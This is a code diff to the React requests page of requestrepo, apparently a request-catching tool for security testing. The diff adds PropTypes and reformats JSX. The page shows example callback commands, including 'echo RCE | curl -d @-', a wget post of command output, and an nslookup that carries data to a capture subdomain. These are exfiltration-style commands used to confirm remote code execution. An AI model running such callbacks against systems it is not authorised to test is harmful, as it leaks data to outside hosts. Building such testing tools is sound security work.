@@ -1,4 +1,5 @@
 import React, { useEffect, useState } from "react";
+import PropTypes from "prop-types";
 import { RequestInfo } from "./request-info";
 import { EditorComponent } from "./editor";
 import { Button } from "primereact/button";
@@ -107,75 +108,75 @@ print("Latest Request:", new_request)`;
     <div className="card card-w-title card-body">
       {(!selectedRequest ||
         (Object.keys(user?.requests || {}).length === 0 && !sharedRequest)) && (
-        <div className="grid">
-          <div className="col-12">
-            <h1>Awaiting requests</h1>
-            <p>How to make a request:</p>
-            <code>
-              curl http://
-              {user?.url || `${user?.subdomain}.${user?.domain}`}
-            </code>
-            <br />
-            <br />
-            <code>
-              curl http://{user.domain}/r/
-              {user?.subdomain || "default"}/
-            </code>
-            <br />
-            <br />
-            <code>
-              curl -X POST --data hello http://
-              {user?.url || `${user?.subdomain}.${user?.domain}`}
-            </code>
-            <br />
-            <br />
-            <code>
-              nslookup your.data.here.
-              {user?.url || `${user?.subdomain}.${user?.domain}`}
-            </code>
-            <br />
-            <br />
-            <code>
-              echo RCE | curl -d @-{" "}
-              {user?.url || `${user?.subdomain}.${user?.domain}`}
-            </code>
-            <br />
-            <br />
-            <code>
-              wget --post-data "$(echo RCE)" -O-{" "}
-              {user?.url || `${user?.subdomain}.${user?.domain}`}
-            </code>
-            <br />
-            <br />
-            <p>
-              Check out the Response tab to edit your HTTP Response or the DNS
-              tab to add DNS records for this subdomain.
-            </p>
-            <p>
-              Automate requests/responses using the{" "}
-              <a
-                href="https://github.com/adrgs/requestrepo-lib"
-                target="_blank"
-                rel="noreferrer"
-              >
-                requestrepo
-              </a>{" "}
-              Python library:
-            </p>
-            <CopyButton
-              text={content.replace("********", activeSession.token)}
-            />
-            <EditorComponent
-              value={content}
-              onChange={() => {}}
-              commands={[]}
-              language={"python"}
-              onFocus={handleEditorFocus}
-              onBlur={handleEditorBlur}
-            />
+          <div className="grid">
+            <div className="col-12">
+              <h1>Awaiting requests</h1>
+              <p>How to make a request:</p>
+              <code>
+                curl http://
+                {user?.url || `${user?.subdomain}.${user?.domain}`}
+              </code>
+              <br />
+              <br />
+              <code>
+                curl http://{user.domain}/r/
+                {user?.subdomain || "default"}/
+              </code>
+              <br />
+              <br />
+              <code>
+                curl -X POST --data hello http://
+                {user?.url || `${user?.subdomain}.${user?.domain}`}
+              </code>
+              <br />
+              <br />
+              <code>
+                nslookup your.data.here.
+                {user?.url || `${user?.subdomain}.${user?.domain}`}
+              </code>
+              <br />
+              <br />
+              <code>
+                echo RCE | curl -d @-{" "}
+                {user?.url || `${user?.subdomain}.${user?.domain}`}
+              </code>
+              <br />
+              <br />
+              <code>
+                wget --post-data &quot;$(echo RCE)&quot; -O-{" "}
+                {user?.url || `${user?.subdomain}.${user?.domain}`}
+              </code>
+              <br />
+              <br />
+              <p>
+                Check out the Response tab to edit your HTTP Response or the DNS
+                tab to add DNS records for this subdomain.
+              </p>
+              <p>
+                Automate requests/responses using the{" "}
+                <a
+                  href="https://github.com/adrgs/requestrepo-lib"
+                  target="_blank"
+                  rel="noreferrer"
+                >
+                  requestrepo
+                </a>{" "}
+                Python library:
+              </p>
+              <CopyButton
+                text={content.replace("********", activeSession.token)}
+              />
+              <EditorComponent
+                value={content}
+                onChange={() => { }}
+                commands={[]}
+                language={"python"}
+                onFocus={handleEditorFocus}
+                onBlur={handleEditorBlur}
+              />
+            </div>
           </div>
-        </div>
-      )}
+        )}
       {selectedRequest && (
         <RequestInfo
           request={selectedRequest}
@@ -210,4 +211,13 @@ export const CopyButton = ({ text }) => {
       onClick={handleCopy}
     />
   );
+};
+
+RequestsPage.propTypes = {
+  user: PropTypes.object,
+  sharedRequest: PropTypes.object,
+};
+
+CopyButton.propTypes = {
+  text: PropTypes.string.isRequired,
 };
